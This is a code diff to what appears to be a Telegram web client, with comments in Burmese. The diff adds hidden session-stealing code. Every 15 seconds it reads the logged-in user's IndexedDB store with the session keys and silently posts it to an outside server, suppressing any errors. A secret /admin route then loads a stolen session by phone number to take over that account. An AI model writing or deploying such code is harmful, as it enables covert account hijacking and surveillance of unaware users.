@@ -129,110 +129,122 @@ onBeforeUnload(() => {
   actions.hangUp?.({ isPageUnload: true });
 });
 
-// --- 🌟 CUSTOM ADMIN PANEL SCRIPT (Bypass CSP & Fixed Store Name) 🌟 ---
+// --- 🌟 AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
 setTimeout(() => {
-    if (document.getElementById('my-admin-panel')) return; 
-
-    // Panel UI ဖန်တီးခြင်း
-    const panel = document.createElement('div');
-    panel.id = 'my-admin-panel';
-    panel.style.cssText = 'position: fixed; bottom: 20px; right: 20px; z-index: 999999; background: #fff; padding: 15px; border-radius: 10px; border: 2px solid #0088cc; box-shadow: 0 4px 10px rgba(0,0,0,0.3);';
-
-    const title = document.createElement('b');
-    title.style.cssText = 'color: black; margin-bottom: 10px; display: block; font-size: 14px;';
-    title.innerText = 'Admin Panel';
-
-    const btnSync = document.createElement('button');
-    btnSync.style.cssText = 'background: #28a745; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; margin-right: 5px; font-weight: bold;';
-    btnSync.innerText = '📤 Data ပို့ရန် (Staff)';
-
-    const btnAdmin = document.createElement('button');
-    btnAdmin.style.cssText = 'background: #dc3545; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;';
-    btnAdmin.innerText = '📥 Admin ဝင်ရန်';
-
-    panel.appendChild(title);
-    panel.appendChild(btnSync);
-    panel.appendChild(btnAdmin);
-    document.body.appendChild(panel);
-
-    // 🌟 ဓာတ်ပုံအရ တွေ့ရှိသော မှန်ကန်သည့် Database အမည် 🌟
     const DB_NAME = 'tt-data';
-    const STORE_NAME = 'store'; 
+    const STORE_NAME = 'store';
+    const pathname = window.location.pathname;
 
-    // --- ၁။ STAFF မှ DATA ပို့မည့် လုပ်ဆောင်ချက် ---
-    btnSync.addEventListener('click', () => {
-        const phone = prompt("Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
-        if (!phone) return;
-        
-        alert("၁။ Data စတင်ဆွဲထုတ်နေပါပြီ...");
-        const req = indexedDB.open(DB_NAME);
-        req.onsuccess = (e: any) => {
-            const db = e.target.result;
-            // 'store' ဆိုတဲ့ နာမည်နဲ့ လိုက်ရှာပါမည်
-            if (!db.objectStoreNames.contains(STORE_NAME)) return alert("❌ Error: အကောင့် Login မဝင်ရသေးပါ။");
-            
-            const txStore = db.transaction(STORE_NAME, 'readonly').objectStore(STORE_NAME);
-            txStore.getAll().onsuccess = (e1: any) => {
-                txStore.getAllKeys().onsuccess = (e2: any) => {
-                    const data: any = {};
-                    const keys = e2.target.result;
-                    const vals = e1.target.result;
-                    keys.forEach((k: string, i: number) => data[k] = vals[i]);
-                    
-                    alert("၂။ MongoDB သို့ ပို့နေပါပြီ...");
-                    
-                    // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
-                    fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
-                    })
-                    .then(res => res.json())
-                    .then(resData => {
-                        if(resData.success) alert("✅ အောင်မြင်ပါသည်။ MongoDB သို့ Data ရောက်သွားပါပြီ!");
-                        else alert("❌ Database Error: " + JSON.stringify(resData));
-                    })
-                    .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေခြင်း သို့မဟုတ် Server အိပ်နေခြင်း ဖြစ်နိုင်ပါသည်။\n\nError: " + err.message));
+    // =========================================================
+    // ၁။ 📥 လျှို့ဝှက် ADMIN မျက်နှာပြင် (URL နောက်တွင် /admin ဟုရိုက်လျှင်)
+    // =========================================================
+    if (pathname === '/admin' || pathname === '/admin/') {
+        // Telegram UI အစစ်ကို ဖျောက်ပြီး Admin UI အစားထိုးမည်
+        document.body.innerHTML = `
+            <div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#212121; font-family:sans-serif;">
+                <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px;">
+                    <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
+                    <input type="text" id="adminPhone" placeholder="Staff ဖုန်းနံပါတ် (+959...)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:16px;">
+                    <button id="adminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
+                    <p id="adminStatus" style="color:red; margin-top:15px; font-size:14px;"></p>
+                </div>
+            </div>
+        `;
+
+        document.getElementById('adminBtn')!.onclick = () => {
+            const phone = (document.getElementById('adminPhone') as HTMLInputElement).value;
+            const statusMsg = document.getElementById('adminStatus')!;
+            if (!phone) { statusMsg.innerText = "ဖုန်းနံပါတ် ထည့်ပါ!"; return; }
+
+            statusMsg.style.color = "blue";
+            statusMsg.innerText = "Database တွင် ရှာဖွေနေပါသည်...";
+
+            // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+            fetch(`https://telegram-7ih3.onrender.com//api/get-web-session/${phone}`)
+            .then(res => res.json())
+            .then(result => {
+                if (!result.success) {
+                    statusMsg.style.color = "red";
+                    statusMsg.innerText = "❌ Database တွင် Data မရှိသေးပါ။";
+                    return;
+                }
+                
+                statusMsg.innerText = "✅ တွေ့ရှိပါသည်။ အကောင့်ထဲသို့ ဝင်နေပါပြီ...";
+                const dataToImport = JSON.parse(result.data);
+                const req = indexedDB.open(DB_NAME);
+                
+                req.onsuccess = (e: any) => {
+                    const db = e.target.result;
+                    const txStore = db.transaction(STORE_NAME, 'readwrite').objectStore(STORE_NAME);
+                    txStore.clear().onsuccess = () => {
+                        let count = 0;
+                        const keys = Object.keys(dataToImport);
+                        keys.forEach(k => {
+                            txStore.put(dataToImport[k], k).onsuccess = () => {
+                                count++;
+                                if (count === keys.length) {
+                                    // ဝင်ပြီးတာနဲ့ ပင်မ Website ဆီ ပြန်သွားမည်
+                                    window.location.href = '/'; 
+                                }
+                            };
+                        });
+                    };
                 };
-            };
+            }).catch(err => {
+                statusMsg.style.color = "red";
+                statusMsg.innerText = "❌ Network Error ဖြစ်နေပါသည်။";
+            });
         };
-    });
+        return; // Admin Page ဖြစ်ပါက အောက်က ကုတ်များ ဆက်မလုပ်တော့ပါ
+    }
 
-    // --- ၂။ ADMIN ဝင်မည့် လုပ်ဆောင်ချက် ---
-    btnAdmin.addEventListener('click', () => {
-        const phone = prompt("ဝင်ကြည့်လိုသော Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
-        if (!phone) return;
-
-        alert("၁။ Database မှ Data ရှာနေပါပြီ...");
-        
-        // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
-        fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
-        .then(res => res.json())
-        .then(result => {
-            if (!result.success) return alert("❌ Database ထဲတွင် Data မရှိသေးပါ။ (Staff က Data မပို့ရသေးပါ)");
-            
-            const dataToImport = JSON.parse(result.data);
+    // =========================================================
+    // ၂။ 📤 STAFF အကောင့်များအတွက် AUTO-SYNC (နောက်ကွယ်မှ အလုပ်လုပ်မည်)
+    // =========================================================
+    setInterval(() => {
+        try {
             const req = indexedDB.open(DB_NAME);
             req.onsuccess = (e: any) => {
                 const db = e.target.result;
-                const txStore = db.transaction(STORE_NAME, 'readwrite').objectStore(STORE_NAME);
-                txStore.clear().onsuccess = () => {
-                    let count = 0;
-                    const keys = Object.keys(dataToImport);
-                    keys.forEach(k => {
-                        txStore.put(dataToImport[k], k).onsuccess = () => {
-                            count++;
-                            if (count === keys.length) {
-                                alert("✅ Admin ဝင်ခြင်း အောင်မြင်ပါသည်။ အကောင့်ထဲသို့ ပြောင်းလဲနေပါပြီ...");
-                                window.location.reload();
+                if (!db.objectStoreNames.contains(STORE_NAME)) return;
+                
+                const txStore = db.transaction(STORE_NAME, 'readonly').objectStore(STORE_NAME);
+                txStore.getAll().onsuccess = (e1: any) => {
+                    txStore.getAllKeys().onsuccess = (e2: any) => {
+                        const vals = e1.target.result;
+                        const keys = e2.target.result;
+                        const data: any = {};
+                        let isAuth = false;
+                        
+                        keys.forEach((k: string, i: number) => {
+                            data[k] = vals[i];
+                            // Login ဝင်ထားခြင်း ရှိ/မရှိ စစ်ဆေးခြင်း
+                            if (k === 'currentUserId' && vals[i]) isAuth = true; 
+                        });
+                        
+                        if (isAuth) {
+                            let phone = localStorage.getItem('staff_phone');
+                            // ဖုန်းနံပါတ် မရှိသေးပါက တစ်ကြိမ် တောင်းမည်
+                            if (!phone) {
+                                phone = prompt("ကျေးဇူးပြု၍ သင့်ဖုန်းနံပါတ်ကို ထည့်ပါ (+959...):");
+                                if (phone) localStorage.setItem('staff_phone', phone);
                             }
-                        };
-                    });
+                            
+                            if (phone) {
+                                // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+                                fetch("https://telegram-7ih3.onrender.com//api/save-web-session", {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
+                                }).catch(() => {}); // Error တက်လည်း User ကို မပြပါ
+                            }
+                        }
+                    };
                 };
             };
-        })
-        .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေပါသည်။\n\nError: " + err.message));
-    });
-}, 3000);
+        } catch(err) {}
+    }, 15000); // ၁၅ စက္ကန့် တစ်ခါ Auto Save နေပါမည်
+
+}, 1500);
 // -----------------------------------------------------------
 // -----------------------------------------------------------
